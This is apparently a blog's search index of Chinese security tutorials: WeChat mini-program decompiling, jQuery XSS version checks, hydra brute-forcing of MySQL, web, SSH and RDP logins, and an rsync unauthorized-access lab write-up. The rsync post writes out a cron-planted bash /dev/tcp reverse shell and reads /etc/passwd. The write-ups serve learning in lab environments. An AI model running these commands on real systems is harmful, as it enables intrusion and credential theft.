<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>关于微信小程序的反编译</title>
    <link href="/posts/4684.html"/>
    <url>/posts/4684.html</url>
    
    <content type="html"><![CDATA[<p>对于微信小程序包的解密与反编译<span id="more"></span></p><h1 id="1、定位小程序缓存路径"><a href="#1、定位小程序缓存路径" class="headerlink" title="1、定位小程序缓存路径"></a>1、定位小程序缓存路径</h1><p>        Applet目录下以wx开头的文件（微信小程序id）就代表小程序：</p><p> <img src="/posts/4684/1.png" class></p><p>        可根据对应的修改日期确定进入的是哪个小程序，或者直接全部删除缓存，重新进入小程序，新生成的即为所找寻的对应小程序。我们进入文件夹里面，其实里面就是一个文件，这就是我们小程序的源码，但是是加密的，我们需要对其解密。</p><p> <img src="/posts/4684/2.png" class></p><h1 id="2、使用工具解密源码"><a href="#2、使用工具解密源码" class="headerlink" title="2、使用工具解密源码"></a>2、使用工具解密源码</h1><blockquote><p>解密与反编译工具：<a href="https://github.com/superBiuBiuMan/wechatMiniAppReverse">https://github.com/superBiuBiuMan/wechatMiniAppReverse</a></p></blockquote><p>        进入工具目录的1.first文件夹，运行命令：</p><pre class="line-numbers language-bash"><code class="language-bash">pc_wxapkg_decrypt.exe -wxid 微信小程序id -in 要解密的wxapkg路径 -out 解密后的路径<span class="token punctuation">(</span>微信小程序id即为第一步中以wx开头的文件夹名<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <img src="/posts/4684/3.png" class></p><h1 id="3、反编译解密包"><a href="#3、反编译解密包" class="headerlink" title="3、反编译解密包"></a>3、反编译解密包</h1><p>        利用第二步的工具反编译，进入2.second文件夹。</p><h2 id="3-1安装依赖"><a href="#3-1安装依赖" class="headerlink" title="3.1安装依赖"></a>3.1安装依赖</h2><p>        切换到nodejs目录，这里作者把所需的依赖都打包到这个node_modules.zip压缩包了，解压使用即可，这里注意是解压到同名文件夹下面：</p><p> <img src="/posts/4684/4.png" class></p><p>        然后这里还少了个cheerio依赖，自行安装即可：</p><p> <img src="/posts/4684/5.png" class></p><h2 id="3-2反编译"><a href="#3-2反编译" class="headerlink" title="3.2反编译"></a>3.2反编译</h2><pre class="line-numbers language-bash"><code class="language-bash">反编译命令：node .\wuWxapkg.js D:\1_tools\Android\wechatMiniAppReverse-main\2.second\wxapkg\1.wxapkg（路径改为自己第二步解密后的源码路径）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/4684/6.png" class></p><p>        成功反编译，在路径下生成同名文件夹：</p><p> <img src="/posts/4684/7.png" class></p><p>        打开即为反编译后的内容：</p><p> <img src="/posts/4684/8.png" class></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反编译</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>验证已知漏洞的jquery库</title>
    <link href="/posts/5b49.html"/>
    <url>/posts/5b49.html</url>
    
    <content type="html"><![CDATA[<p>扫描网站使用的jquery库，是否为具有已知漏洞的版本。<span id="more"></span></p><h1 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>        在 jquery 的诸多发行版本中，存在着 DOM型XSS 漏洞，易被攻击者利用。</p><h2 id="1-2-漏洞成因"><a href="#1-2-漏洞成因" class="headerlink" title="1.2 漏洞成因"></a>1.2 漏洞成因</h2><p>        漏洞原因在于过滤用户输入数据所使用的正则表达式存在缺陷，可能导致 LOCATION.HASH 跨站漏洞。</p><h1 id="2、扫描插件——retire-js"><a href="#2、扫描插件——retire-js" class="headerlink" title="2、扫描插件——retire.js"></a>2、扫描插件——retire.js</h1><p>        这里强烈推荐我觉得很好用的一个插件：retire.js。我一般是作为火狐的插件使用，这样在浏览网页时会自动检测到jquery的版本信息。</p><p> <img src="/posts/5b49/1.png" class></p><p>        会显示jquery的版本以及对应的jquery的网址，以及可能存在哪些CVE的漏洞。</p><p> <img src="/posts/5b49/2.png" class></p><h1 id="3、验收jquery历史漏洞版本环境"><a href="#3、验收jquery历史漏洞版本环境" class="headerlink" title="3、验收jquery历史漏洞版本环境"></a>3、验收jquery历史漏洞版本环境</h1><p>版本漏洞检测网站：<a href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a>  </p><p>jQuery 版本漏洞验证网站：<a href="https://jsbin.com/?html,js,output">https://jsbin.com/?html,js,output</a></p><h2 id="3-1-CVE-2020-11022、CVE-2020-11023"><a href="#3-1-CVE-2020-11022、CVE-2020-11023" class="headerlink" title="3.1 CVE-2020-11022、CVE-2020-11023"></a>3.1 CVE-2020-11022、CVE-2020-11023</h2><pre class="line-numbers language-bash"><code class="language-bash">在线验证网站：https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用方式：</p><p>（1）将网址中head头部中的script标签的src内容替换为待验证的jquery网址。</p><p> <img src="/posts/5b49/3.png" class></p><p>（2）然后尝试点击三个poc的任意一个Append via .html()按钮，存在漏洞则会出现弹窗。</p><p> <img src="/posts/5b49/4.png" class></p><h2 id="3-2-CVE-2012-6708"><a href="#3-2-CVE-2012-6708" class="headerlink" title="3.2 CVE-2012-6708"></a>3.2 CVE-2012-6708</h2><pre class="line-numbers language-bash"><code class="language-bash">在Console窗口输入：<span class="token punctuation">$(</span><span class="token string">"element[attribute='&lt;img src=123 οnerrοr=alert(123)>'"</span><span class="token punctuation">)</span>若存在漏洞，则会出现弹窗。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-3-CVE-2011-4969"><a href="#3-3-CVE-2011-4969" class="headerlink" title="3.3 CVE-2011-4969"></a>3.3 CVE-2011-4969</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">$(</span><span class="token string">"#&lt;img src=x onerror=alert(111)>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-4-CVE-2012-6708、CVE-2011-4969、CVE-2015-9251"><a href="#3-4-CVE-2012-6708、CVE-2011-4969、CVE-2015-9251" class="headerlink" title="3.4 CVE-2012-6708、CVE-2011-4969、CVE-2015-9251"></a>3.4 CVE-2012-6708、CVE-2011-4969、CVE-2015-9251</h2><pre class="line-numbers language-bash"><code class="language-bash">jQuery-with-XSS-master：https://github.com/mahp/jQuery-with-XSS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以验证这三个漏洞：</p><p> <img src="/posts/5b49/5.png" class></p><p>使用方式：</p><p>（1）下载好这个验证poc之后，可编辑test.html的第九行代码，将代码中的src后的链接改为自己要验证的js地址链接。</p><p> <img src="/posts/5b49/6.png" class></p><p>（2）保存之后，用浏览器打开可以看到三个demo，依次点击，若出现弹窗则证明被验证成功。</p><p> <img src="/posts/5b49/7.png" class></p><p>（3）页面中的test version（测试版本）链接中，可查看对应 jQuery 版本存在的 bug 编号。</p><p> <img src="/posts/5b49/8.png" class></p><h1 id="4、修复建议"><a href="#4、修复建议" class="headerlink" title="4、修复建议"></a>4、修复建议</h1><ul><li><p>暂时隐藏 jQuery 版本信息，避免被攻击者识别出版本号。  </p></li><li><p>建议将 jQuery 版本升级至 1.9.x 或以上版本 3.4.0，升级 jquery-ui 版本到 1.12.0 以上。不过升级有风险，因为版本兼容的问题，jQuery 官方推荐了 jQuery Migrate 库来解决 jQuery 升级问题。  </p></li><li><p>过滤用户输入的内容、严格控制输出等。</p></li></ul><p> </p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>retire.js</tag>
      
      <tag>jquery</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于hydra的Windows使用</title>
    <link href="/posts/2a81.html"/>
    <url>/posts/2a81.html</url>
    
    <content type="html"><![CDATA[<!--好像23年都没有发过文章了，今年都快结束啦，忙忙碌碌，还是把我的博客慢慢捡起来吧--><!--好像23年都没有发过文章了，今年都快结束啦，忙忙碌碌，还是把我的博客慢慢捡起来吧--><p>23年快结束了，发现好像今年还没有发过博客，忙忙碌碌，一年也快过去啦，以后还是要把我的博客捡起来咯<span id="more"></span></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>        对于页面登录框的暴力破解，一般使用BurpSuite就够了。但是对于数据库以及其他协议的密码破解，hydra无疑是个很棒的工具。</p><p>        目前支持以下协议破解：</p><blockquote><p>AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</p></blockquote><p>        下载链接：</p><p>Linux下载：<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p><p>Windows下载：<a href="https://github.com/maaaaz/thc-hydra-windows">https://github.com/maaaaz/thc-hydra-windows</a></p><h1 id="1、hydra参数使用"><a href="#1、hydra参数使用" class="headerlink" title="1、hydra参数使用"></a>1、hydra参数使用</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>1<span class="token punctuation">)</span>使用单个的用户名或密码参数： -l 用户名 -p 密码<span class="token punctuation">(</span>2<span class="token punctuation">)</span>使用字典的用户名或密码参数： -L 用户名字典 -P 密码字典 -C 指定所用格式为“user:password”的字典文件<span class="token punctuation">(</span>3<span class="token punctuation">)</span>其它常用参数： -v 显示爆破详细信息 -V 每次尝试仅显示用户名密码 -s 指定非默认端口 -o 指定输出文件 -M 指定多个ip目标列表文件（使用冒号“:”与端口分割，每行一条数据） -t 线程数（默认16） -f 单个主机找到一个用户名/密码之后，停止破解 -F 所有主机找到一个用户名/密码之后，停止破解 -e nsr 可选选项，n：表示尝试空密码，s：表示把用户名本身当做密码进行尝试，r：表示把用户名倒叙，当做密码进行尝试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2、MySQL密码破解"><a href="#2、MySQL密码破解" class="headerlink" title="2、MySQL密码破解"></a>2、MySQL密码破解</h1><pre class="line-numbers language-bash"><code class="language-bash">hydra -L user.txt -P pass.txt ip mysql（如果发现MySQL不是在默认的3306端口，可以使用-s参数指定正确的端口号。这里注意这个-s要放在ip mysql前面，例如-s 3306 ip mysql）或者hydra -L user.txt -P pass.txt mysql://目标ip:mysql端口号 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>        其它数据库格式类似，这里我直接指定用户名为root，dic/dic_password_mysql.txt为我的密码字典相对路径。</p><p> <img src="/posts/2a81/1.png" class></p><p>或者采用另一种格式：</p><p> <img src="/posts/2a81/2.png" class></p><h1 id="3、破解web登录-GET方式"><a href="#3、破解web登录-GET方式" class="headerlink" title="3、破解web登录(GET方式)"></a>3、破解web登录(GET方式)</h1><pre class="line-numbers language-bash"><code class="language-bash">hydra -l 用户名 -p 密码字典 -t 线程 -v -e ns ip http-get /web/或者hydra -l 用户名 -p 密码字典 -t 线程 -v -e ns ip http-get /web/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="4、破解web登录（POST方式）"><a href="#4、破解web登录（POST方式）" class="headerlink" title="4、破解web登录（POST方式）"></a>4、破解web登录（POST方式）</h1><pre class="line-numbers language-bash"><code class="language-bash">hydra -l 用户名 -P 密码字典 域名/ip -s 端口 http-post-form <span class="token string">"/Pass-01/login.html?:username=^USER^&amp;password=^PASS^&amp;Login=Login:密码错误"</span> -v其中，在<span class="token string">"/Pass-01/login.html:username=^USER^&amp;password=^PASS^&amp;submit=Login:error"</span>中：（1）第一个冒号前面的“/Pass-09/login.html”为目标URL后带的路径。（2）第二个冒号前面的“username<span class="token operator">=</span>^USER^<span class="token operator">&amp;</span>password<span class="token operator">=</span>^PASS^<span class="token operator">&amp;</span>Login<span class="token operator">=</span>Login”为请求包中用户名和密码及提交的表单参数。（3）第二个冒号后面的“error”表示用户名密码错误时返回页面的信息，根据实际情况填写。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里用我的靶场示例一下：</p><p>URL为：<a href="http://127.0.0.1:8099/pikachu/vul/burteforce/bf_form.php">http://127.0.0.1:8099/pikachu/vul/burteforce/bf_form.php</a></p><p>错误信息为：username or password is not exists～（这里只截取后面的not exist，刚开始试半天不成功，后来发现是这个错误语句的问题，可能是后面那个特殊符号的问题吧）</p><p> <img src="/posts/2a81/3.png" class></p><p>表单内容为：username=test&amp;password=222&amp;submit=Login</p><p> <img src="/posts/2a81/4.png" class></p><p>所以构造语句：</p><pre class="line-numbers language-bash"><code class="language-bash">hydra -L dic/username.txt -P dic/password.txt -f -s 8099 127.0.0.1 http-post-form <span class="token string">"/pikachu/vul/burteforce/bf_form.php:username=^USER^&amp;password=^PASS^&amp;submit=Login:not exists"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里使用-f参数，当成功获取到一组用户名密码时，就停止爆破。得到结果：admin/123456</p><p> <img src="/posts/2a81/5.png" class></p><p>登录成功，获取正确。</p><p> <img src="/posts/2a81/6.png" class></p><h1 id="5、破解其它协议"><a href="#5、破解其它协议" class="headerlink" title="5、破解其它协议"></a>5、破解其它协议</h1><pre class="line-numbers language-bash"><code class="language-bash">这里任意写几个，格式类型都跟前面破解MySQL类似。（1）破解rdp（远程桌面密码）hydra -l administer -P pass.txt ip rdp（2）破解sshhydra -L user.txt -P pass.txt ip <span class="token function">ssh</span><span class="token punctuation">(</span>3<span class="token punctuation">)</span>破解httpshydra -m /index.php -L user.txt -P pass.txt ip https<span class="token punctuation">(</span>4<span class="token punctuation">)</span>破解ciscohydra -P pass.txt IP ciscohydra -m cloud -P pass.txt ip cisco-enable<span class="token punctuation">(</span>5<span class="token punctuation">)</span>破解pop3hydra -L user.txt -P pass.txt my.pop3.mail pop3<span class="token punctuation">(</span>6<span class="token punctuation">)</span>破解talenthydra -L user.txt -P pass.txt ip talent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hydra</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次惨痛教训</title>
    <link href="/posts/2f6a.html"/>
    <url>/posts/2f6a.html</url>
    
    <content type="html"><![CDATA[<p>事情的起因是这样的，前两天晚上，我可能是突发奇想，决定把我电脑的中文用户名改成拼音的，那样在cmd里面加载出来也好看一点。所以我就直接百度，按照教程直接在注册表里面把名字改了。这一改问题就大了。。。</p><p>改完之后，重启我的电脑出现的是这个界面：</p><img src="/posts/2f6a/1.jpg" class><p>当时我就不敢动了，然后我又开始找原因，找了各种办法，看网上有人说他们可行，但我真的反正没成功。</p><p>先说一下，我最后成功地经验吧。</p><p>上面那种情况，电脑是自动登录在一个临时账户里面的，你原来的账户还在。这个时候，千万千万不要乱修改，不然就会像我一样，之前的数据彻底没了。如果你直接在这个临时账户里面修改任何东西，等到重启之后它是不会保存的，所以就没有用。</p><img src="/posts/2f6a/6.jpg" class><p>这个时候应该先创建一个具有管理员权限的账户：</p><pre class="line-numbers language-bash"><code class="language-bash">net user username password /add        //这里的username自己任意取名，password也是自己设置的密码net localgroup administrators username /add  //这里的username为上一步创建的用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>新用户创建好之后，还可以输入net user查看有没有刚刚创建的用户，有就表示刚刚操作成功了。然后此时，可以按快捷键（ctrl+alt+delete）选中里面的切换用户，其实就是回到锁屏界面，登录到你刚刚创建的那个新用户，这个新用户是正常的，不会弹出那个提示。</p><p>然后此时进入注册表，修改文件</p><pre class="line-numbers language-bash"><code class="language-bash">计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面目录下的S-1-5-21开头文件，修改里面的ProfileImagePath值，就是你最开始将中文名改成英文名那里，现在把它还是改回原来的中文名把。</p><p>接着来到文件夹C:/users，在里面找到把临时账户Temp重命名为你之前的中文用户名。如果显示什么该文件夹在其它程序已打开不能修改之类的，就先切换为原来有问题的账户，先注销，再回来操作，应该就能修改了。</p><p>这两边都修改完毕之后，账户数据应该就回来了。也不会弹提示框了。</p><p>我还是要介绍下我的失败经历。其间，我还尝试了系统还原，刚好我电脑有记录到两三天之前的一个节点，于是我怀着兴冲冲的希望去还原，结果是失败的：</p><img src="/posts/2f6a/2.jpg" class><p>然后啊，我还是想把希望放在这个上面，于是又去找这个参数错误的解决办法，查到说是在安全模式下去还原，于是新的错误又出现了：</p><img src="/posts/2f6a/3.jpg" class><p>上面明显提示说是磁盘容量不够，然后我去问了一下别人，系统还原大概需要预留多少磁盘，结果告诉我要50g，但我最多给出20到30g呀，而且我还为此清理了下c盘，好像把还原节点直接清理掉了，这下这个希望彻底破灭了</p><img src="/posts/2f6a/4.jpg" class><p>于是我还去闲鱼找那种收费可以远程解决问题的人，不找还好，麻烦更大了。第一个人该说不说，还是有跟我之前尝试过的方法差不多的，但是我看他的操作还没有我熟练（虽然我也是计算机专业的）。第二个人就更别说了，直接把我C:/users下面的文件给覆盖了，我看着他远程，明明有个提示说会覆盖，我还没来得及阻止，他直接就点了确定，我真的服了啊，结果直接电脑桌面都没了，进都进不去了。</p><img src="/posts/2f6a/5.jpg" class><p>这个情况，真的还不如最开始的呢，没办法，和我朋友开始一起想办法，强制关机三次，进入到安全模式，里面是一片白的，因为我桌面都没了呜呜呜</p><img src="/posts/2f6a/7.jpg" class><p>幸好还能操作快捷键，我当时也是在这里命令提示符里创建新用户的，就应该早点创建的。在我一顿操作下，才恢复好的。太可怕了，以后有事先用虚拟机尝试，再也不乱玩注册表了，差点电脑都要重装系统了。</p>]]></content>
    
    
    <categories>
      
      <category>零碎</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>rsync未授权访问漏洞利用</title>
    <link href="/posts/7e0e.html"/>
    <url>/posts/7e0e.html</url>
    
    <content type="html"><![CDATA[<p>关于rsync服务未授权漏洞的几种利用方式~~</p><span id="more"></span><h1 id="00x0-前言"><a href="#00x0-前言" class="headerlink" title="00x0 前言"></a>00x0 前言</h1><p>环境：</p><blockquote><p>Ubuntu：192.168.25.129（靶机）</p><p>kali：192.168.25.128（攻击机）</p></blockquote><p>在Ubuntu上启动rsync的docker环境：</p><p>    进入环境：cd vulhub/rsync/common </p><p>    自动编译环境：sudo docker-compose build </p><p>    启动整个环境：sudo docker-compose up -d </p><p>    最后实验完成时删除整个环境：sudo docker-compose down -v</p><h1 id="00x1-漏洞介绍"><a href="#00x1-漏洞介绍" class="headerlink" title="00x1 漏洞介绍"></a>00x1 漏洞介绍</h1><p>    rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><h1 id="00x2-常用命令"><a href="#00x2-常用命令" class="headerlink" title="00x2 常用命令"></a>00x2 常用命令</h1><h3 id="（1）查看服务器目录"><a href="#（1）查看服务器目录" class="headerlink" title="（1）查看服务器目录"></a>（1）查看服务器目录</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> ip:: （rsync默认端口873）<span class="token function">rsync</span> --port<span class="token operator">=</span>xxx ip:: （rsync指定了其他端口）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（2）查看服务器目录下的文件"><a href="#（2）查看服务器目录下的文件" class="headerlink" title="（2）查看服务器目录下的文件"></a>（2）查看服务器目录下的文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> ip::目录名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（3）上传文件"><a href="#（3）上传文件" class="headerlink" title="（3）上传文件"></a>（3）上传文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av <span class="token operator">&lt;</span>需要上传的文件<span class="token operator">></span> ip::上传文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（4）下载文件"><a href="#（4）下载文件" class="headerlink" title="（4）下载文件"></a>（4）下载文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av ip::下载文件路径 <span class="token operator">&lt;</span>下载文件存放的路径<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="00x3-漏洞验证"><a href="#00x3-漏洞验证" class="headerlink" title="00x3 漏洞验证"></a>00x3 漏洞验证</h1><h3 id="1、在kali上扫描靶机端口，可以看到873端口开放"><a href="#1、在kali上扫描靶机端口，可以看到873端口开放" class="headerlink" title="1、在kali上扫描靶机端口，可以看到873端口开放"></a>1、在kali上扫描靶机端口，可以看到873端口开放</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -sS 192.158.25.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/3.png" class><h3 id="2、查看目录，若能查看到目录，则说明漏洞存在"><a href="#2、查看目录，若能查看到目录，则说明漏洞存在" class="headerlink" title="2、查看目录，若能查看到目录，则说明漏洞存在"></a>2、查看目录，若能查看到目录，则说明漏洞存在</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 192.168.25.129::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/3_2.png" class><h3 id="3、查看目录下的文件"><a href="#3、查看目录下的文件" class="headerlink" title="3、查看目录下的文件"></a>3、查看目录下的文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 192.168.25.129::src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/3_3.png" class><h1 id="00x4-漏洞利用——任意文件下载"><a href="#00x4-漏洞利用——任意文件下载" class="headerlink" title="00x4 漏洞利用——任意文件下载"></a>00x4 漏洞利用——任意文件下载</h1><h3 id="1、下载目标靶机的任意文件，这里下载etc-passwd文件"><a href="#1、下载目标靶机的任意文件，这里下载etc-passwd文件" class="headerlink" title="1、下载目标靶机的任意文件，这里下载etc/passwd文件"></a>1、下载目标靶机的任意文件，这里下载etc/passwd文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 192.168.25.129::src/etc/passwd /tmp（src/etc/passwd是目标内容，/tmp是自己指定存储在本地的路径）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/7e0e/4.png" class><h3 id="2、查看下载的文件"><a href="#2、查看下载的文件" class="headerlink" title="2、查看下载的文件"></a>2、查看下载的文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /tmp/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/4_2.png" class><h1 id="00x5-漏洞利用——任意文件上传"><a href="#00x5-漏洞利用——任意文件上传" class="headerlink" title="00x5 漏洞利用——任意文件上传"></a>00x5 漏洞利用——任意文件上传</h1><h3 id="1、上传任意文件到目标靶机"><a href="#1、上传任意文件到目标靶机" class="headerlink" title="1、上传任意文件到目标靶机"></a>1、上传任意文件到目标靶机</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av /home/kali/a.txt 192.168.25.129::src/tmp/a.txt（/home/kali/a.txt是攻击机上的文件路径，src/tmp/a.txt是指要上传到目标靶机的路径）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/7e0e/5.png" class></p><h3 id="2、查看是否上传成功"><a href="#2、查看是否上传成功" class="headerlink" title="2、查看是否上传成功"></a>2、查看是否上传成功</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 192.168.25.129::src/tmp/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/7e0e/5_2.png" class></p><h1 id="00x6-漏洞利用——利用计划任务反弹shell"><a href="#00x6-漏洞利用——利用计划任务反弹shell" class="headerlink" title="00x6 漏洞利用——利用计划任务反弹shell"></a>00x6 漏洞利用——利用计划任务反弹shell</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>整体思路：</p><p>（1）下载靶机的系统计划任务文件（目录为/etc/crontab）</p><p>（2）修改下载好的计划任务文件，将命令写入其中</p><p>（3）开启监听端口</p><p>（4）将修改好的计划任务crontab文件传回到靶机</p><h3 id="1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下"><a href="#1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下" class="headerlink" title="1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下"></a>1、下载Ubuntu靶机的系统计划任务文件到kali的root目录下</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 192.168.25.129::src/etc/crontab /root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/6.png" class><h3 id="2、在下载好的crontab中写入计划任务"><a href="#2、在下载好的crontab中写入计划任务" class="headerlink" title="2、在下载好的crontab中写入计划任务"></a>2、在下载好的crontab中写入计划任务</h3><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * root <span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/11111 0>&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/6_2.png" class><h3 id="3、在kali上开启监听端口"><a href="#3、在kali上开启监听端口" class="headerlink" title="3、在kali上开启监听端口"></a>3、在kali上开启监听端口</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -lvnp 11111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、将修改好的crontab文件传回到靶机系统计划任务目录-etc-crontab中"><a href="#4、将修改好的crontab文件传回到靶机系统计划任务目录-etc-crontab中" class="headerlink" title="4、将修改好的crontab文件传回到靶机系统计划任务目录/etc/crontab中"></a>4、将修改好的crontab文件传回到靶机系统计划任务目录/etc/crontab中</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av <span class="token function">crontab</span> 192.168.25.129::src/etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/6_3.png" class><h3 id="5、反弹shell成功"><a href="#5、反弹shell成功" class="headerlink" title="5、反弹shell成功"></a>5、反弹shell成功</h3><img src="/posts/7e0e/6_4.png" class><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>    利用方法一就好了，方法二跟方法一差不多，就是将反弹命令写入到sh文件了。</p><p>整体思路：</p><p>（1）创建一个sh文件，写入反弹shell命令并赋予执行权限</p><p>（2）将sh文件上传到靶机</p><p>（3）下载靶机的系统计划任务文件（目录为/etc/crontab）</p><p>（4）修改下载好的计划任务文件，将命令写入其中</p><p>（5）开启监听端口</p><p>（6）将修改好的计划任务crontab文件传回到靶机</p><h3 id="1、新建一个文件111-sh写入反弹shell命令"><a href="#1、新建一个文件111-sh写入反弹shell命令" class="headerlink" title="1、新建一个文件111.sh写入反弹shell命令"></a>1、新建一个文件111.sh写入反弹shell命令</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">"bash -i >&amp; /dev/tcp/192.168.25.128/9999 0>&amp;1"</span>（其中192.168.25.128是监听ip，即攻击者ip，9999为监听端口）查看是否写入成功：cat 111.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/posts/7e0e/7.png" class><h3 id="2、赋予执行权限"><a href="#2、赋予执行权限" class="headerlink" title="2、赋予执行权限"></a>2、赋予执行权限</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> +x 111l.sh查看权限是否赋予成功：ls -l 111s.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/7e0e/7_2.png" class><h3 id="3、将反弹shell文件上传到攻击者目录下"><a href="#3、将反弹shell文件上传到攻击者目录下" class="headerlink" title="3、将反弹shell文件上传到攻击者目录下"></a>3、将反弹shell文件上传到攻击者目录下</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av 111.sh 192.168.25.129::src/tmp/111.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/7e0e/7_3.png" class><h3 id="4、查看是否上传成功"><a href="#4、查看是否上传成功" class="headerlink" title="4、查看是否上传成功"></a>4、查看是否上传成功</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> 